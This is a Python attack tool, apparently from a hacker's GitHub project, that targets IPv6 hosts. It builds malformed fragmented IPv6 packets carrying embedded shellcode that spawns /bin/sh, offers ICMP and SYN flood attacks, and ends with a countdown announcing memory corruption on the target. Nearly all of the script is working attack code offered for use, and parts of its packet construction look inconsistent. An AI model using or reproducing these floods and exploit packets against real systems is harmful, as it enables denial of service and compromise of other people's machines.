print(f'''
\033[1;34m                                                                              ,----,                                  ,--,                 
                                     ,----..                                ,/   .`|     ,----..        ,----..    ,---.'|                 
            ,---,.    .--.--.       /   /   \       ,---,                 ,`   .'  :    /   /   \      /   /   \   |   | :      .--.--.    
          ,'  .'  \  /  /    '.    /   .     :    .'  .' `\             ;    ;     /   /   .     :    /   .     :  :   : |     /  /    '.  
        ,---.' .' | |  :  /`. /   .   /   ;.  \ ,---.'     \          .'___,/    ,'   .   /   ;.  \  .   /   ;.  \ |   ' :    |  :  /`. /  
        |   |  |: | ;  |  |--`   .   ;   /  ` ; |   |  .`\  |         |    :     |   .   ;   /  ` ; .   ;   /  ` ; ;   ; '    ;  |  |--`   
        :   :  :  / |  :  ;_     ;   |  ; \ ; | :   : |  '  |         ;    |.';  ;   ;   |  ; \ ; | ;   |  ; \ ; | '   | |__  |  :  ;_     
        :   |    ;   \  \    `.  |   :  | ; | ' |   ' '  ;  :         `----'  |  |   |   :  | ; | ' |   :  | ; | ' |   | :.'|  \  \    `.        v.1
        |   :     \   `----.   \ .   |  ' ' ' : '   | ;  .  |             '   :  ;   .   |  ' ' ' : .   |  ' ' ' : '   :    ;   `----.   \ 
        |   |   . |   __ \  \  | '   ;  \; /  | |   | :  |  '             |   |  '   '   ;  \; /  | '   ;  \; /  | |   |  ./    __ \  \  | 
        '   :  '; |  /  /`--'  /  \   \  ',  /  '   : | /  ;              '   :  |    \   \  ',  /   \   \  ',  /  ;   : ;     /  /`--'  / 
        |   |  | ;  '--'.     /    ;   :    /   |   | '` ,/               ;   |.'      ;   :    /     ;   :    /   |   ,/     '--'.     /  
        |   :   /     `--'---'      \   \ .'    ;   :  .'                 '---'         \   \ .'       \   \ .'    '---'        `--'---'   
        |   | ,'                     `---`      |   ,.'                                  `---`          `---`                              
        `----'                                  '---'                                                                                      

    Developed by https://github.com/ThemeHackers
    Developed by https://www.instagram.com/_theme.ifning/
                                                                                                                                           
\033[0m''')


import argparse
import subprocess
import sys
import pkg_resources
from scapy.all import *
import time
import os
import logging
import shutil

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def install_package(package):
    """Install a package using pip."""
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
        logging.info(f"Successfully installed {package}.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Error installing {package}: {str(e)}")
        sys.exit(1)

def check_git_installed():
    """Check if Git is installed."""
    if not shutil.which("git"):
        logging.error("Git is not installed. Please install Git first.")
        sys.exit(1)

def install_v6disc():
    """Clone the v6disc repository if not already cloned."""
    check_git_installed()
    repo_url = "https://github.com/cvmiller/v6disc"
    clone_dir = "v6disc"

    if not os.path.exists(clone_dir):
        logging.info("Cloning v6disc repository...")
        result = subprocess.run(['git', 'clone', repo_url], capture_output=True, text=True)
        if result.returncode != 0:
            logging.error(f"Failed to clone repository: {result.stderr}")
            sys.exit(1)
    else:
        logging.info("v6disc is already cloned.")

# Install necessary packages
required_packages = ['scapy', 'psutil']
installed_packages = [pkg.key for pkg in pkg_resources.working_set]

for package in required_packages:
    if package not in installed_packages:
        logging.info(f"{package} not found. Installing...")
        install_package(package)
    else:
        logging.info(f"{package} is already installed.")

install_v6disc()

# Argument parsing
parser = argparse.ArgumentParser(description="IPv6 Vulnerability Simulation Script by HackerTheme.")
parser.add_argument("--iface", type=str, required=True, help="Network interface(s) to use for sending packets, comma-separated for multiple.")
parser.add_argument("--ipv6", type=str, help="Destination IP address (optional).")
parser.add_argument("--mac_addr", type=str, default='', help="Destination MAC address (optional).")
parser.add_argument("--num_tries", type=int, default=30, help="Number of tries per batch.")
parser.add_argument("--num_batches", type=int, default=30, help="Number of batches of tries.")
args = parser.parse_args()

ifaces = args.iface.split(',')
ipv6 = args.ipv6
mac_addr = args.mac_addr
num_tries = args.num_tries
num_batches = args.num_batches

# ANSI colors for terminal output
RESET = '\033[0m'
RED = '\033[91m'
MAGENTA = '\033[95m'
GREEN = '\033[92m'

# Shellcode (potentially dangerous, modify as per testing needs)
shellcode = ("\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0"
             "\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")

def get_packets_with_mac(i):
    """Generate packets with a specified MAC address."""
    frag_id = 0xdebac1e + i
    first = Ether(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrDestOpt(options=[PadN(otype=0x81, optdata='a'*3)])
    second = Ether(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m=1, offset=0) / 'aaaaaaaa'
    third = Ether(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m=0, offset=1)
    return [first, second, third]

def get_packets(i):
    """Generate packets without a MAC address."""
    if mac_addr:
        return get_packets_with_mac(i)
    frag_id = 0xdebac1e + i
    first = IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrDestOpt(options=[PadN(otype=0x81, optdata='a'*3)])
    second = IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m=1, offset=0) / 'aaaaaaaa'
    third = IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m=0, offset=1)
    return [first, second, third]

def get_exploit_packet(i):
    """Generate exploit packets."""
    if mac_addr:
        return get_packets(i)
    frag_id = 0xdebac1e + i
    first = Ether(dst=ipv6) / IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrDestOpt(options=[PadN(otype=0x81, optdata='a'*3)])
    second = IPv6(hlim=64+i, dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m=1, offset=0) / shellcode
    third = Ether(dst=ipv6) / IPv6(fl=1, hlim=64+i, dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m=0, offset=1)
    return [first, second, third]

def icmp_flood_attack(ipv6):
    """Perform ICMP flood attack."""
    logging.info(f"Starting ICMP flood attack on {ipv6}...")
    number_of_deliveries = int(input("Enter the number of ICMP flood attack shipments: "))
    send(IPv6(dst=ipv6) / ICMP() / "Flood Start!", count=1)
    for _ in range(number_of_deliveries):
        send(IPv6(dst=ipv6) / ICMP() / "Flood!", count=1000)
    send(IPv6(dst=ipv6) / ICMP() / "Flood End!", count=1)

def syn_flood_attack(i, ipv6):
    """Perform SYN flood attack."""
    logging.info(f"Starting SYN flood attack on {ipv6}...")
    frag_id = 0xdebac1e + i
    number_of_deliveries = int(input("Enter the number of SYN flood attack shipments: "))
    send(IPv6(dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m=1, offset=0) / TCP(sport=RandShort(), dport=80, flags="S"), count=1)
    for i in range(number_of_deliveries):
        frag_id = 0xdebac1e + i
        send(IPv6(hlim=64 + i, dst=ipv6) / IPv6ExtHdrFragment(id=frag_id, m=1, offset=0) / TCP(sport=RandShort(), dport=80, flags="S"), count=1000)
    send(IPv6(dst=ipv6) / IPv6ExtHdrFragment(id=frag_id + 1, m=1, offset=0) / TCP(sport=RandShort(), dport=80, flags="S"), count=1)

def prompt_select_attack(ipv6):
    """Prompt user to select attack type."""
    print("\nSelect an attack type:")
    print("[1] ICMP Flood Attack")
    print("[2] SYN Flood Attack")
    print("[3] Skip Attack")
    choice = input("Your choice: ")

    if choice == '1':
        icmp_flood_attack(ipv6)
    elif choice == '2':
        syn_flood_attack(0, ipv6)
    else:
        logging.info("Skipping flood attack.")

def prompt_run_v6disc():
    """Prompt user to run v6disc.sh."""
    print("\n" + "="*80)
    print("               v6disc.sh - IPv6 Discovery Script")
    print("="*80 + "\n")
    print("Please select an option:")
    print("  [y] Run v6disc.sh Advanced scan")
    print("  [o] Run v6disc.sh General scan")
    print("  [s] Skipping v6disc.sh...")
    print("  [n] exit\n")
    run_script = input("Your choice (y/o/s/n): ").lower()

    if run_script == 'y':
        logging.info("Running v6disc.sh Advanced scan...")
        os.system('sudo bash v6disc/v6disc.sh -i eth0 -L -D -N -n')
    elif run_script == 'o':
        logging.info("Running v6disc.sh General scan...")
        os.system('sudo bash v6disc/v6disc.sh -L')
    elif run_script == 's':
        logging.info("Skipping v6disc.sh...")
        return ipv6
    else:
        logging.info("Exiting...")
        sys.exit()

def prompt_send_dangerous_packets():
    """Prompt user to send dangerous packets."""
    run_packets = input("Do you want to send a dangerous package? (y/n): ").lower()
    if run_packets == 'y':
        logging.info("Sending packets...")
        for iface in ifaces:
            sendp(final_ps, iface=iface) if mac_addr else send(final_ps, iface=iface)
    elif run_packets == 'n':
        logging.info("Exiting program...")
        sys.exit()
    else:
        logging.warning("Invalid input. Skipping packet sending...")

if not ipv6:
    logging.info("Scanning network for available IPv6 addresses...")
    prompt_run_v6disc()
    time.sleep(1)
    ipv6 = input("No IPv6 address provided. Please enter the IPv6 address you want to use: ")
    mac_addr = input("Enter MAC address if auto-find is not possible: ")
else:
    use_ipv6 = input(f"Do you want to use the provided IPv6 address {ipv6}? (y/n): ").lower()
    if use_ipv6 == 'n':
        ipv6 = input("Please enter the new IPv6 address (Can be left blank): ")
    elif use_ipv6 != 'y':
        logging.error("Invalid input. Exiting...")
        sys.exit()

final_ps = []

# Generate packets
for _ in range(num_batches):
    for i in range(num_tries):
        final_ps += get_packets(i) + get_exploit_packet(i) + get_packets(i)

if ipv6:
    prompt_select_attack(ipv6)
    prompt_send_dangerous_packets()
else:
    prompt_run_v6disc()
    prompt_select_attack(ipv6)
    prompt_send_dangerous_packets()

for i in range(60):
    print(f"{MAGENTA}Memory corruption will be triggered in {60-i} seconds{RESET}", end='\r')
    time.sleep(1)

logging.info("Scanning and monitoring completed. Exiting...")

